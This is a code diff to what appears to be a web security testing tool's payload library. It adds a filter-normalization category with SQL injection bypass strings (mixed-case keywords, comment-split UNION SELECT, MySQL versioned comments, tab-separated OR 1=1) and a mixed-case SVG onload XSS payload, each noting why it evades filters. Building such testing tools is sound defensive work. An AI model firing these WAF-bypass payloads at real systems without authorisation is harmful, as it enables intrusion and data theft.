@@ -197,6 +197,17 @@ PAYLOAD_CATEGORIES: Tuple[PayloadCategory, ...] = (
         "CWE-943",
     ),
     PayloadCategory(
+        "normalization",
+        "Encoding / filter normalization",
+        "Case, comment, whitespace, and parser-normalization comparison probes.",
+        "Send the canonical and transformed forms as a pair. A transformed "
+        "payload is only interesting when application behavior stays equivalent "
+        "while a filter decision changes.",
+        "query",
+        ("query", "path", "form", "json", "header", "raw_body"),
+        "—",
+    ),
+    PayloadCategory(
         "custom",
         "Custom",
         "Locally saved or imported payloads.",
@@ -746,6 +757,67 @@ BUILTIN_PAYLOADS: Tuple[PayloadTemplate, ...] = (
         locations=("json", "raw_body"),
         tags=("operator", "starter"),
         platform="MongoDB-style",
+    ),
+    # Normalization variants preserve the old Intruder WAF-bypass coverage,
+    # but present each transform with a comparison signal instead of a grab-bag.
+    _template(
+        "normalization-sql-case",
+        "normalization",
+        "Case variation",
+        "Mixed-case SQL keyword",
+        "SeLeCt",
+        "Tests filters that match SQL keywords case-sensitively.",
+        "Compare with canonical SELECT; application parsing is equivalent while "
+        "the filter decision changes.",
+        tags=("sql", "case", "paired-control"),
+    ),
+    _template(
+        "normalization-sql-comment",
+        "normalization",
+        "Comment boundaries",
+        "Split UNION SELECT keywords",
+        "UN/**/ION SEL/**/ECT",
+        "Places inline comments inside common SQL keywords.",
+        "The database normalizes the comments while the filter treats the "
+        "transformed text differently from canonical UNION SELECT.",
+        tags=("sql", "comments", "paired-control"),
+        impact="Moderate",
+    ),
+    _template(
+        "normalization-mysql-comment",
+        "normalization",
+        "Comment boundaries",
+        "MySQL versioned comment",
+        "/*!50000SELECT*/",
+        "Uses a MySQL executable versioned comment around a keyword.",
+        "MySQL executes the keyword while the filter handles it differently "
+        "from canonical SELECT.",
+        tags=("sql", "mysql", "comments"),
+        platform="MySQL / MariaDB",
+        impact="Moderate",
+    ),
+    _template(
+        "normalization-sql-whitespace",
+        "normalization",
+        "Whitespace variation",
+        "Tab-separated boolean condition",
+        "1\tOR\t1=1",
+        "Replaces spaces with tab separators in a basic boolean condition.",
+        "The true condition remains equivalent while filtering differs from "
+        "the ordinary-space control.",
+        tags=("sql", "whitespace", "paired-control"),
+    ),
+    _template(
+        "normalization-xss-case",
+        "normalization",
+        "Case variation",
+        "Mixed-case SVG event",
+        "<sVg/oNlOaD=alert(document.domain)>",
+        "Uses HTML's case-insensitive tag and attribute parsing.",
+        "The browser builds the same executable element while filtering differs "
+        "from a lowercase control.",
+        tags=("xss", "html", "case", "paired-control"),
+        impact="Moderate",
     ),
 )
 
